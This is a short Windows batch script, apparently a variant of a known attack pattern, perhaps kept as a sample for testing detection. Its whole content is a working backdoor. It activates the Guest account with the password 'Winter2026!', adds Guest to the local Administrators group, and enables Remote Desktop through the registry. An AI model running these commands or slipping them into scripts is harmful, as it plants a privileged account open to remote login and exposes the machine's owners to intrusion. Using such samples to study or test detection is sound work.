@echo off
rem renamed password, net.exe spelling, registry RDP enable
net.exe user "Guest" Winter2026! /active:yes
net.exe localgroup "Administrators" "Guest" /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
